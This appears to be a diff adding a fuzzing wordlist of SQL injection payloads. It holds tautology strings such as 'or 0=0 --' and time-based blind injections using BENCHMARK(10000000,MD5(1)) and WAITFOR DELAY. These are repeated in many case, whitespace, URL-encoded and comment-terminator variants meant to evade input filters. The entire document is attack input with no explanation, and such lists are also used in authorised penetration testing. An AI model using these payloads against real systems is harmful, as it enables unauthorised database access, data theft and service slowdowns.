+\"a\"\"+or+3=3--\" %23
+\"A\"\"+OR+3=3--\" %23
+\"a\"\"+or+3=3--\"-- 
+\"A\"\"+OR+3=3--\"-- 
+\"a\"\"\tor\t3=3--\"
+\"A\"\"\tOR\t3=3--\"
+\"a\"\"\tor\t3=3--\" -- 
+\"A\"\"\tOR\t3=3--\" -- 
+\"a\"\"\tor\t3=3--\" -- -
+\"A\"\"\tOR\t3=3--\" -- -
+\"a\"\"\tor\t3=3--\" --+
+\"A\"\"\tOR\t3=3--\" --+
+\"a\"\"\tor\t3=3--\" #
+\"A\"\"\tOR\t3=3--\" #
+\"a\"\"\tor\t3=3--\"/*
+\"A\"\"\tOR\t3=3--\"/*
+\"a\"\"\tor\t3=3--\" %23
+\"A\"\"\tOR\t3=3--\" %23
+\"a\"\"\tor\t3=3--\"-- 
+\"A\"\"\tOR\t3=3--\"-- 
+\" or benchmark(10000000,MD5(1))#
+\" or benchmark(10000000,md5(1))#
+\" OR BENCHMARK(10000000,MD5(1))#
+\" or benchmark(10000000,MD5(1))# -- 
+\" or benchmark(10000000,md5(1))# -- 
+\" OR BENCHMARK(10000000,MD5(1))# -- 
+\" or benchmark(10000000,MD5(1))# -- -
+\" or benchmark(10000000,md5(1))# -- -
+\" OR BENCHMARK(10000000,MD5(1))# -- -
+\" or benchmark(10000000,MD5(1))# --+
+\" or benchmark(10000000,md5(1))# --+
+\" OR BENCHMARK(10000000,MD5(1))# --+
+\" or benchmark(10000000,MD5(1))# #
+\" or benchmark(10000000,md5(1))# #
+\" OR BENCHMARK(10000000,MD5(1))# #
+\" or benchmark(10000000,MD5(1))#/*
+\" or benchmark(10000000,md5(1))#/*
+\" OR BENCHMARK(10000000,MD5(1))#/*
+\" or benchmark(10000000,MD5(1))# %23
+\" or benchmark(10000000,md5(1))# %23
+\" OR BENCHMARK(10000000,MD5(1))# %23
+\" or benchmark(10000000,MD5(1))#-- 
+\" or benchmark(10000000,md5(1))#-- 
+\" OR BENCHMARK(10000000,MD5(1))#-- 
+\"/**/or/**/benchmark(10000000,MD5(1))#
+\"/**/or/**/benchmark(10000000,md5(1))#
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))#
+\"/**/or/**/benchmark(10000000,MD5(1))# -- 
+\"/**/or/**/benchmark(10000000,md5(1))# -- 
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))# -- 
+\"/**/or/**/benchmark(10000000,MD5(1))# -- -
+\"/**/or/**/benchmark(10000000,md5(1))# -- -
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))# -- -
+\"/**/or/**/benchmark(10000000,MD5(1))# --+
+\"/**/or/**/benchmark(10000000,md5(1))# --+
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))# --+
+\"/**/or/**/benchmark(10000000,MD5(1))# #
+\"/**/or/**/benchmark(10000000,md5(1))# #
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))# #
+\"/**/or/**/benchmark(10000000,MD5(1))#/*
+\"/**/or/**/benchmark(10000000,md5(1))#/*
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))#/*
+\"/**/or/**/benchmark(10000000,MD5(1))# %23
+\"/**/or/**/benchmark(10000000,md5(1))# %23
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))# %23
+\"/**/or/**/benchmark(10000000,MD5(1))#-- 
+\"/**/or/**/benchmark(10000000,md5(1))#-- 
+\"/**/OR/**/BENCHMARK(10000000,MD5(1))#-- 
+\"%20or%20benchmark(10000000,MD5(1))#
+\"%20or%20benchmark(10000000,md5(1))#
+\"%20OR%20BENCHMARK(10000000,MD5(1))#
+\"%20or%20benchmark(10000000,MD5(1))# -- 
+\"%20or%20benchmark(10000000,md5(1))# -- 
+\"%20OR%20BENCHMARK(10000000,MD5(1))# -- 
+\"%20or%20benchmark(10000000,MD5(1))# -- -
+\"%20or%20benchmark(10000000,md5(1))# -- -
+\"%20OR%20BENCHMARK(10000000,MD5(1))# -- -
+\"%20or%20benchmark(10000000,MD5(1))# --+
+\"%20or%20benchmark(10000000,md5(1))# --+
+\"%20OR%20BENCHMARK(10000000,MD5(1))# --+
+\"%20or%20benchmark(10000000,MD5(1))# #
+\"%20or%20benchmark(10000000,md5(1))# #
+\"%20OR%20BENCHMARK(10000000,MD5(1))# #
+\"%20or%20benchmark(10000000,MD5(1))#/*
+\"%20or%20benchmark(10000000,md5(1))#/*
+\"%20OR%20BENCHMARK(10000000,MD5(1))#/*
+\"%20or%20benchmark(10000000,MD5(1))# %23
+\"%20or%20benchmark(10000000,md5(1))# %23
+\"%20OR%20BENCHMARK(10000000,MD5(1))# %23
+\"%20or%20benchmark(10000000,MD5(1))#-- 
+\"%20or%20benchmark(10000000,md5(1))#-- 
+\"%20OR%20BENCHMARK(10000000,MD5(1))#-- 
+\"+or+benchmark(10000000,MD5(1))#
+\"+or+benchmark(10000000,md5(1))#
+\"+OR+BENCHMARK(10000000,MD5(1))#
+\"+or+benchmark(10000000,MD5(1))# -- 
+\"+or+benchmark(10000000,md5(1))# -- 
+\"+OR+BENCHMARK(10000000,MD5(1))# -- 
+\"+or+benchmark(10000000,MD5(1))# -- -
+\"+or+benchmark(10000000,md5(1))# -- -
+\"+OR+BENCHMARK(10000000,MD5(1))# -- -
+\"+or+benchmark(10000000,MD5(1))# --+
+\"+or+benchmark(10000000,md5(1))# --+
+\"+OR+BENCHMARK(10000000,MD5(1))# --+
+\"+or+benchmark(10000000,MD5(1))# #
+\"+or+benchmark(10000000,md5(1))# #
+\"+OR+BENCHMARK(10000000,MD5(1))# #
+\"+or+benchmark(10000000,MD5(1))#/*
+\"+or+benchmark(10000000,md5(1))#/*
+\"+OR+BENCHMARK(10000000,MD5(1))#/*
+\"+or+benchmark(10000000,MD5(1))# %23
+\"+or+benchmark(10000000,md5(1))# %23
+\"+OR+BENCHMARK(10000000,MD5(1))# %23
+\"+or+benchmark(10000000,MD5(1))#-- 
+\"+or+benchmark(10000000,md5(1))#-- 
+\"+OR+BENCHMARK(10000000,MD5(1))#-- 
+\"\tor\tbenchmark(10000000,MD5(1))#
+\"\tor\tbenchmark(10000000,md5(1))#
+\"\tOR\tBENCHMARK(10000000,MD5(1))#
+\"\tor\tbenchmark(10000000,MD5(1))# -- 
+\"\tor\tbenchmark(10000000,md5(1))# -- 
+\"\tOR\tBENCHMARK(10000000,MD5(1))# -- 
+\"\tor\tbenchmark(10000000,MD5(1))# -- -
+\"\tor\tbenchmark(10000000,md5(1))# -- -
+\"\tOR\tBENCHMARK(10000000,MD5(1))# -- -
+\"\tor\tbenchmark(10000000,MD5(1))# --+
+\"\tor\tbenchmark(10000000,md5(1))# --+
+\"\tOR\tBENCHMARK(10000000,MD5(1))# --+
+\"\tor\tbenchmark(10000000,MD5(1))# #
+\"\tor\tbenchmark(10000000,md5(1))# #
+\"\tOR\tBENCHMARK(10000000,MD5(1))# #
+\"\tor\tbenchmark(10000000,MD5(1))#/*
+\"\tor\tbenchmark(10000000,md5(1))#/*
+\"\tOR\tBENCHMARK(10000000,MD5(1))#/*
+\"\tor\tbenchmark(10000000,MD5(1))# %23
+\"\tor\tbenchmark(10000000,md5(1))# %23
+\"\tOR\tBENCHMARK(10000000,MD5(1))# %23
+\"\tor\tbenchmark(10000000,MD5(1))#-- 
+\"\tor\tbenchmark(10000000,md5(1))#-- 
+\"\tOR\tBENCHMARK(10000000,MD5(1))#-- 
+or 0=0 --
+OR 0=0 --
+or 0=0 -- -- 
+OR 0=0 -- -- 
+or 0=0 -- -- -
+OR 0=0 -- -- -
+or 0=0 -- --+
+OR 0=0 -- --+
+or 0=0 -- #
+OR 0=0 -- #
+or 0=0 --/*
+OR 0=0 --/*
+or 0=0 -- %23
+OR 0=0 -- %23
+or 0=0 ---- 
+OR 0=0 ---- 
+or/**/0=0/**/--
+OR/**/0=0/**/--
+or/**/0=0/**/-- -- 
+OR/**/0=0/**/-- -- 
+or/**/0=0/**/-- -- -
+OR/**/0=0/**/-- -- -
+or/**/0=0/**/-- --+
+OR/**/0=0/**/-- --+
+or/**/0=0/**/-- #
+OR/**/0=0/**/-- #
+or/**/0=0/**/--/*
+OR/**/0=0/**/--/*
+or/**/0=0/**/-- %23
+OR/**/0=0/**/-- %23
+or/**/0=0/**/---- 
+OR/**/0=0/**/---- 
+or%200=0%20--
+OR%200=0%20--
+or%200=0%20-- -- 
+OR%200=0%20-- -- 
+or%200=0%20-- -- -
+OR%200=0%20-- -- -
+or%200=0%20-- --+
+OR%200=0%20-- --+
+or%200=0%20-- #
+OR%200=0%20-- #
+or%200=0%20--/*
+OR%200=0%20--/*
+or%200=0%20-- %23
+OR%200=0%20-- %23
+or%200=0%20---- 
+OR%200=0%20---- 
+or+0=0+--
+OR+0=0+--
+or+0=0+-- -- 
+OR+0=0+-- -- 
+or+0=0+-- -- -
+OR+0=0+-- -- -
+or+0=0+-- --+
+OR+0=0+-- --+
+or+0=0+-- #
+OR+0=0+-- #
+or+0=0+--/*
+OR+0=0+--/*
+or+0=0+-- %23
+OR+0=0+-- %23
+or+0=0+---- 
+OR+0=0+---- 
+or\t0=0\t--
+OR\t0=0\t--
+or\t0=0\t-- -- 
+OR\t0=0\t-- -- 
+or\t0=0\t-- -- -
+OR\t0=0\t-- -- -
+or\t0=0\t-- --+
+OR\t0=0\t-- --+
+or\t0=0\t-- #
+OR\t0=0\t-- #
+or\t0=0\t--/*
+OR\t0=0\t--/*
+or\t0=0\t-- %23
+OR\t0=0\t-- %23
+or\t0=0\t---- 
+OR\t0=0\t---- 
+1 waitfor delay '0:0:10'--
+1 WAITFOR DELAY '0:0:10'--
+1 waitfor delay '0:0:10'-- -- 
+1 WAITFOR DELAY '0:0:10'-- -- 
+1 waitfor delay '0:0:10'-- -- -
+1 WAITFOR DELAY '0:0:10'-- -- -
+1 waitfor delay '0:0:10'-- --+
+1 WAITFOR DELAY '0:0:10'-- --+
+1 waitfor delay '0:0:10'-- #
+1 WAITFOR DELAY '0:0:10'-- #
+1 waitfor delay '0:0:10'--/*
+1 WAITFOR DELAY '0:0:10'--/*
+1 waitfor delay '0:0:10'-- %23
+1 WAITFOR DELAY '0:0:10'-- %23
+1 waitfor delay '0:0:10'---- 
+1 WAITFOR DELAY '0:0:10'---- 
+1/**/waitfor/**/delay/**/'0:0:10'--
+1/**/WAITFOR/**/DELAY/**/'0:0:10'--
+1/**/waitfor/**/delay/**/'0:0:10'-- -- 
+1/**/WAITFOR/**/DELAY/**/'0:0:10'-- -- 
